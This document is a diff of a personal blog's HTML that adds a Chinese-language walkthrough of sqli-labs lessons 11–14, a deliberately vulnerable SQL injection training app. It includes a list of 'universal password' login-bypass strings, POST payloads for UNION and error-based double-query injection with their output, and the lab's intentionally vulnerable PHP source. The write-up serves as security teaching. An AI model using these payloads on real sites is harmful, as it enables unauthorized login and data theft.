@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql注入,sqli-labs," />
 
 
 
@@ -79,14 +79,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://yoursite.com/tags/index.html">
+<meta name="description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
+<meta name="keywords" content="sql注入,sqli-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs-Less-11-14">
+<meta property="og:url" content="http://yoursite.com/2018/04/23/sqli-labs-Less-11-14/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
+<meta property="og:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-19T00:53:06.656Z">
+<meta property="og:updated_time" content="2018-04-23T05:45:08.049Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tags">
+<meta name="twitter:title" content="sqli-labs-Less-11-14">
+<meta name="twitter:description" content="Less-11 POST - Error Based - Single quotes - String基于报错的单引号字符注入如何绕过身份验证登入进去？万能密码登入常用万能密码 asp、aspx 1:   &amp;quot;or &amp;quot;a&amp;quot;=&amp;quot;a 2： &amp;apos;)or(&amp;apos;a&amp;apos;=&amp;apos;a 3：or 1=1-- 4：&amp;apos;or 1=1-- 5：a">
 
 
 
@@ -116,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/tags/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-14/"/>
 
 
 
 
 
-  <title>tags | Ahodor'Via</title>
+  <title>sqli-labs-Less-11-14 | Ahodor'Via</title>
   
 
 
@@ -271,40 +275,370 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/23/sqli-labs-Less-11-14/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">tags</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <div class="tag-cloud">
-            <div class="tag-cloud-title">
-                4 tags in total
-            </div>
-            <div class="tag-cloud-tags">
-              <a href="/tags/python/" style="font-size: 18px; color: #8e8e8e">python</a> <a href="/tags/sqli-labs/" style="font-size: 30px; color: #111">sqli-labs</a> <a href="/tags/sqlmap/" style="font-size: 12px; color: #ccc">sqlmap</a> <a href="/tags/sql注入/" style="font-size: 24px; color: #4f4f4f">sql注入</a>
-            </div>
-          </div>
+          <h1 class="post-title" itemprop="name headline">sqli-labs-Less-11-14</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-23T13:43:17+08:00">
+                2018-04-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="Less-11-POST-Error-Based-Single-quotes-String"><a href="#Less-11-POST-Error-Based-Single-quotes-String" class="headerlink" title="Less-11 POST - Error Based - Single quotes - String"></a>Less-11 POST - Error Based - Single quotes - String</h2><h3 id="基于报错的单引号字符注入"><a href="#基于报错的单引号字符注入" class="headerlink" title="基于报错的单引号字符注入"></a>基于报错的单引号字符注入</h3><p>如何绕过身份验证登入进去？<strong>万能密码登入</strong><br>常用万能密码</p>
+<pre><code>asp、aspx
+1:   &quot;or &quot;a&quot;=&quot;a
+2： &apos;)or(&apos;a&apos;=&apos;a
+3：or 1=1--
+4：&apos;or 1=1--
+5：a&apos;or&apos; 1=1--
+6： &quot;or 1=1--
+7：&apos;or&apos;a&apos;=&apos;a
+8： &quot;or&quot;=&quot;a&apos;=&apos;a
+9：&apos;or&apos;&apos;=&apos;
+10：&apos;or&apos;=&apos;or&apos;
+11: 1 or &apos;1&apos;=&apos;1&apos;=1
+12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1
+13: &apos;OR 1=1%00
+14: &quot;or 1=1%00
+15: &apos;xor
+16: 新型万能登陆密码
+用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin）
+密码 1
+Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23
+ Password=1
+ 17..admin&apos; or &apos;a&apos;=&apos;a 密码随便
+
+PHP万能密码
+&apos;or&apos;=&apos;or&apos; 
+&apos;or 1=1/* 字符型 GPC是否开都可以使用
+User: something
+Pass: &apos; OR &apos;1&apos;=&apos;1
+
+jsp 万能密码 
+1&apos;or&apos;1&apos;=&apos;1
+admin&apos; OR 1=1/*
+用户名：admin 系统存在这个用户的时候 才用得上
+密码：1&apos;or&apos;1&apos;=&apos;1
+</code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h3 id="（1）万能密码"><a href="#（1）万能密码" class="headerlink" title="（1）万能密码"></a>（1）万能密码</h3><p>在passwd字段后面构造<strong>万能密码+闭合单引号</strong></p>
+<pre><code>uname=admin&amp;passwd=1&apos; or &apos;1&apos;=&apos;1&amp;submit=Submit
+返回
+Your Login name:Dumb
+Your Password:Dumb
+</code></pre><p>在uname字段后面构造<strong>万能密码+闭合单引号</strong></p>
+<pre><code>uname=admin&apos; or &apos;1&apos;=&apos;1&amp;passwd=1&amp;submit=Submit
+返回
+Your Login name:admin
+Your Password:admin
+</code></pre><p>我们发现两者返回的账户密码不一样，查看源代码</p>
+<pre><code>    &lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+
+// take the variables
+if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
+{
+    $uname=$_POST[&apos;uname&apos;];
+    $passwd=$_POST[&apos;passwd&apos;];
+
+    //logging the connection parameters to a file for analysis.
+    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
+    fwrite($fp,&apos;User Name:&apos;.$uname);
+    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
+    fclose($fp);
+
+
+    // connectivity 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
+    $result=mysql_query($sql);
+    $row = mysql_fetch_array($result);
+
+    if($row)
+    {
+        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
+        //echo &quot; You Have successfully logged in\n\n &quot; ;
+        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;    
+
+        echo &quot;&lt;/font&gt;&quot;;
+    }
+    else  
+    {
+        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
+        //echo &quot;Try again looser&quot;;
+        print_r(mysql_error());
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;    
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+
+?&gt;
+sql语句如下：
+SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1
+情况一：
+
+    SELECT username, password FROM users WHERE username=&apos;admin&apos; and password=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; LIMIT 0,1
+情况二：
+
+    SELECT username, password FROM users WHERE username=&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; and password=&apos;1&apos; LIMIT 0,1
+</code></pre><p><strong>and</strong> 优先级高，所以情况一<strong>前面为False</strong>，但是<strong>与True或运算为true</strong>，返回了第一个账号和密码；情况二<strong>后面为False，但存在admin这个账户，或运算为True</strong>，返回了admin账号的账号和密码</p>
+<h3 id="（2）联合查询"><a href="#（2）联合查询" class="headerlink" title="（2）联合查询"></a>（2）联合查询</h3><pre><code>uname=test &amp;passwd=test&apos; order by 3%23 返回错误
+uname=test &amp;passwd=test&apos; order by 2%23 返回正确
+uname=test &amp;passwd=test&apos; union select 1,2 %23
+返回：Your Login name:1 
+    Your Password:2
+</code></pre><p>剩下的注入查询数据库信息与之前get类似</p>
+<h2 id="Less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Less-12 POST - Error Based - Double quotes - String -with twist"></a>Less-12 POST - Error Based - Double quotes - String -with twist</h2><h3 id="基于报错的双引号带括号的字符注入"><a href="#基于报错的双引号带括号的字符注入" class="headerlink" title="基于报错的双引号带括号的字符注入"></a>基于报错的双引号带括号的字符注入</h3><p>与Less-11类似</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><pre><code>1、直接注释
+uname=admin &amp;passwd=1&quot;) or &quot;1&quot;=&quot;1&quot; %23
+2、闭合绕过
+uname=admin &amp;passwd=1&quot;) or (&quot;1&quot;=&quot;1
+uname=admin&quot;) or( &quot;1&quot;=&quot;1 &amp;passwd=1
+
+联合查询
+uname=test &amp;passwd=test&quot;) order by 3 %23返回错误
+uname=test &amp;passwd=test&quot;) order by 2 %23返回正确
+uname=test &amp;passwd=test&quot;) union select 1,2 %23
+返回：
+Your Login name:1
+Your Password:2
+同上
+</code></pre><h2 id="Less-13-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-13-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-13 POST-Double Injection-Single quotes-String -with twist"></a>Less-13 POST-Double Injection-Single quotes-String -with twist</h2><p>### </p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><pre><code>加单引号
+uname=test &amp;passwd=test&apos;
+报错如下 &apos;&apos;test&apos;&apos;) LIMIT 0,1&apos;
+</code></pre><p>可知是单引号和括号包裹变量</p>
+<pre><code>uname=test &amp;passwd=test&apos;) %23返回正常
+uname=test &amp;passwd=test&apos;) or 1=1%23 显示successfully loggend in 
+</code></pre><p>源代码如下：</p>
+<pre><code>&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+
+// take the variables
+if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))
+{
+    $uname=$_POST[&apos;uname&apos;];
+    $passwd=$_POST[&apos;passwd&apos;];
+
+    //logging the connection parameters to a file for analysis.
+    $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
+    fwrite($fp,&apos;User Name:&apos;.$uname.&quot;\n&quot;);
+    fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);
+    fclose($fp);
+
+
+    // connectivity 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
+    $result=mysql_query($sql);
+    $row = mysql_fetch_array($result);
+
+    if($row)
+    {
+        //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;    
+
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;
+        //echo &quot; You Have successfully logged in &quot; ;
+        echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;    
+        echo &quot;&lt;br&gt;&quot;;
+        //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
+        //echo &quot;&lt;br&gt;&quot;;
+        //echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
+        //echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&apos;;    
+
+        echo &quot;&lt;/font&gt;&quot;;
+    }
+    else  
+    {
+        echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;
+        //echo &quot;Try again looser&quot;;
+        print_r(mysql_error());
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &apos;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&apos;;    
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+
+?&gt;
+</code></pre><p>登入成功返回的是flag.jpg图片，图片显示successfully logined in；失败是slap.jpg的图片。不会显示登入的账号和密码信息</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h4 id="万能密码登入"><a href="#万能密码登入" class="headerlink" title="万能密码登入"></a>万能密码登入</h4><pre><code>uname=test &amp;passwd=test&apos;) or 1=1%23 
+</code></pre><h4 id="双注入查询"><a href="#双注入查询" class="headerlink" title="双注入查询"></a>双注入查询</h4><p>原理参考Less-5</p>
+<pre><code>uname=test &amp;passwd=test&apos;) or 1=1 order by 3 %23返回错误
+uname=test &amp;passwd=test&apos;) or 1=1 order by 2 %23返回正常
+uname=test &amp;passwd=test&apos;) or 1=1 union select 1,2 %23返回成功但是没有显示位
+</code></pre><p>使用<strong>双查询注入</strong>方式</p>
+<pre><code>uname=test &amp;passwd=test&apos;)  union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23
+返回
+Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos;
+</code></pre><p>剩下的参考Less-5</p>
+<h2 id="Less-14-POST-Double-Injection-Double-quotes-String-with-twist"><a href="#Less-14-POST-Double-Injection-Double-quotes-String-with-twist" class="headerlink" title="Less-14 POST-Double Injection-Double quotes-String-with twist"></a>Less-14 POST-Double Injection-Double quotes-String-with twist</h2><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><pre><code>单引号
+uname=test &amp;passwd=test&apos; or 1=1 %23返回失败图片 
+双引号
+uname=test &amp;passwd=test&quot;or 1=1 %23 返回成功图片
+</code></pre><p>参数是由双引号包裹</p>
+<p>源代码</p>
+<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
+$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
+@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+</code></pre><p>注意点号是起连接作用，将变量一前一后分别连接一个双引号<br>这里调试直接echo出变量可以看到</p>
+<pre><code>uname=uname &amp;passwd=passwd
+输出：&quot;uname &quot;&quot;passwd&quot;
+</code></pre><p>可以看到是单引号包裹着</p>
+<p>测试字段数    </p>
+<pre><code>uname=uname &amp;passwd=passwd&quot; or  1=1 order by 2 %23
+</code></pre><p>剩下的与Less-13相似</p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+            <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/22/sqli-labs-Less-8-10/" rel="next" title="sqli-labs-Less-8-10">
+                <i class="fa fa-chevron-left"></i> sqli-labs-Less-8-10
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -337,8 +671,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -389,6 +732,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-11-POST-Error-Based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Less-11 POST - Error Based - Single quotes - String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的单引号字符注入"><span class="nav-number">1.1.</span> <span class="nav-text">基于报错的单引号字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）万能密码"><span class="nav-number">1.3.</span> <span class="nav-text">（1）万能密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（2）联合查询"><span class="nav-number">1.4.</span> <span class="nav-text">（2）联合查询</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-12-POST-Error-Based-Double-quotes-String-with-twist"><span class="nav-number">2.</span> <span class="nav-text">Less-12 POST - Error Based - Double quotes - String -with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于报错的双引号带括号的字符注入"><span class="nav-number">2.1.</span> <span class="nav-text">基于报错的双引号带括号的字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">2.2.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-13-POST-Double-Injection-Single-quotes-String-with-twist"><span class="nav-number">3.</span> <span class="nav-text">Less-13 POST-Double Injection-Single quotes-String -with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">3.1.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-number">3.2.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#万能密码登入"><span class="nav-number">3.2.1.</span> <span class="nav-text">万能密码登入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#双注入查询"><span class="nav-number">3.2.2.</span> <span class="nav-text">双注入查询</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-14-POST-Double-Injection-Double-quotes-String-with-twist"><span class="nav-number">4.</span> <span class="nav-text">Less-14 POST-Double Injection-Double quotes-String-with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试-1"><span class="nav-number">4.1.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
